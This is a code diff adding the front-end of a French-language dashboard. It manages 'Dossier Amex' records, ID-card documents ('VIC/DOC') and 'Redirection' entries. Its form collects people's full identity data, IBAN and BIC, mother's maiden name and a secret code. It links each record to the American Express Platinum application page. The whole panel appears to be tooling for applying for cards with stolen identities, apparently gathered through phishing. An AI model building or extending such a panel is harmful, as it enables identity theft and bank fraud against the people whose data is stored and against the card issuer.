+        if (data.dossiers && Array.isArray(data.dossiers)) {
+            // Filtrer pour enlever le dossier à supprimer
+            const nouveauxDossiers = data.dossiers.filter(d => d.id !== id);
+            
+            // Sauvegarder le nouveau tableau
+            const saveResponse = await fetch('backend-amex/dossier-amex.php', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(nouveauxDossiers)
+            });
+            
+            if (saveResponse.ok) {
+                alert('Dossier supprimé avec succès !');
+                await chargerDossiers(); // Recharger la liste
+            } else {
+                alert('Erreur lors de la suppression');
+            }
+        }
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('Erreur de connexion au serveur');
+    }
+}
+		
+        function verifierDocument(id) {
+            alert(`Vérification du document ${id}`);
+        }
+
+        // Navigation entre rubriques
+        document.querySelectorAll('.nav-link').forEach(link => {
+            link.addEventListener('click', (e) => {
+                e.preventDefault();
+                
+                document.querySelectorAll('.nav-link').forEach(l => l.classList.remove('active'));
+                link.classList.add('active');
+                
+                const rubrique = link.getAttribute('data-rubrique');
+                document.querySelectorAll('.rubrique-content').forEach(content => content.classList.remove('active'));
+                
+                if (rubrique === 'dossier') {
+                    document.getElementById('dossierContent').classList.add('active');
+                    document.getElementById('mainTitle').innerText = 'Dossier Amex';
+                } else if (rubrique === 'vicdoc') {
+                    document.getElementById('vicdocContent').classList.add('active');
+                    document.getElementById('mainTitle').innerText = 'VIC/DOC';
+                } else if (rubrique === 'redirection') {
+                    document.getElementById('redirectionContent').classList.add('active');
+                    document.getElementById('mainTitle').innerText = 'Redirection';
+                }
+            });
+        });
+
+        // Recherche
+        document.getElementById('searchDossier')?.addEventListener('input', (e) => {
+            afficherDossiers(e.target.value);
+        });
+        
+        document.getElementById('searchDoc')?.addEventListener('input', (e) => {
+            afficherDocuments(e.target.value);
+        });
+
+// Initialisation
+chargerDossiers();
+chargerDocumentsCNI();
+afficherDocuments();
+chargerRedirections();
+
+        // Gestion de la modale
+function creerDossier() {
+    document.getElementById('dossierModal').style.display = 'flex';
+}
+
+function fermerModal() {
+    document.getElementById('dossierModal').style.display = 'none';
+    document.getElementById('dossierForm').reset();
+}
+
+// Gestion des champs dynamiques
+document.getElementById('secteur').addEventListener('change', function() {
+    console.log('Secteur changé:', this.value);
+    const boulotGroup = document.getElementById('boulotGroup');
+    const boulotSelect = document.getElementById('boulot');
+    
+    if (this.value === 'Activités financières et d\'assurance') {
+        boulotGroup.style.display = 'block';
+        boulotSelect.innerHTML = `
+            <option value="">-- Sélectionnez --</option>
+            <option value="Allianz">Allianz</option>
+            <option value="AXA">AXA</option>
+            <option value="Natixis Investment Managers">Natixis Investment Managers</option>
+        `;
+        boulotSelect.required = true;
+    } else if (this.value === 'Industrie manufacturière') {
+        boulotGroup.style.display = 'block';
+        boulotSelect.innerHTML = `
+            <option value="">-- Sélectionnez --</option>
+            <option value="Michelin">Michelin</option>
+            <option value="Philips">Philips</option>
+            <option value="Dyson">Dyson</option>
+            <option value="Sony">Sony</option>
+        `;
+        boulotSelect.required = true;
+    } else {
+        boulotGroup.style.display = 'none';
+        boulotSelect.required = false;
+    }
+});
+
+// Enregistrement du dossier
+document.getElementById('dossierForm').addEventListener('submit', async function(e) {
+    e.preventDefault();
+    
+    const secteur = document.getElementById('secteur').value;
+    const boulot = document.getElementById('boulot').value;
+    
+    const dossierData = {
+    id: 'DOS-' + Date.now(),
+    dateCreation: new Date().toISOString().split('T')[0],
+    lienDossier: 'https://www.americanexpress.com/fr-fr/charge-cards/apply/personal/platinum',
+    prenom: document.getElementById('prenom').value,
+    nom: document.getElementById('nom').value,
+    dateNaissance: document.getElementById('dateNaissance').value,
+    email: document.getElementById('email').value,
+    telephone: document.getElementById('telephone').value,
+    villeNaissance: document.getElementById('villeNaissance').value,
+    departementNaissance: document.getElementById('departementNaissance').value,
+    adresseLivraison: document.getElementById('adresseLivraison').value,
+    iban: document.getElementById('iban').value,
+    bic: document.getElementById('bic').value,
+    montantAnnuel: document.getElementById('montantAnnuel').value,
+    categorie: document.getElementById('categorie').value,
+    profession: document.getElementById('profession').value,
+    secteur: secteur,
+    boulot: document.getElementById('boulot').value,
+    anciennete: document.getElementById('anciennete').value,
+    nomJeuneFille: document.getElementById('nomJeuneFille').value,
+    codeSecret: document.getElementById('codeSecret').value,
+    status: 'en_attente'
+};
+    
+    try {
+        const response = await fetch('/backend-amex/dossier-amex.php', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dossierData)
+        });
+        
+        if (response.ok) {
+    await chargerDossiers();
+    alert('Dossier créé avec succès !');
+    fermerModal();
+} else {
+            alert('Erreur lors de l\'enregistrement');
+        }
+    } catch (error) {
+        console.error('Erreur:', error);
+        alert('Erreur de connexion au serveur');
+    }
+});
+
+// Dans window.onclick, remplace par :
+window.onclick = function(event) {
+    const modalCreer = document.getElementById('dossierModal');
+    const modalVoir = document.getElementById('voirDossierModal');
+    if (event.target === modalCreer) {
+        fermerModal();
+    }
+    if (event.target === modalVoir) {
+        fermerVoirModal();
+    }
+};
+    </script>
+	
+	<!-- Modal Voir Dossier -->
+<div id="voirDossierModal" class="modal">
+    <div class="modal-content" style="max-width: 800px;">
+        <div class="modal-header">
+            <h2>📄 Détails du dossier</h2>
+        </div>
+        <div id="voirDossierContent" style="display: grid; grid-template-columns: 1fr 1fr; gap: 10px; font-size: 14px;">
+            <!-- Le contenu sera injecté ici -->
+        </div>
+        <div class="modal-footer">
+            <button type="button" class="btn-cancel" onclick="fermerVoirModal()">Fermer</button>
+        </div>
+    </div>
+</div>
+	
+</body>
+</html>
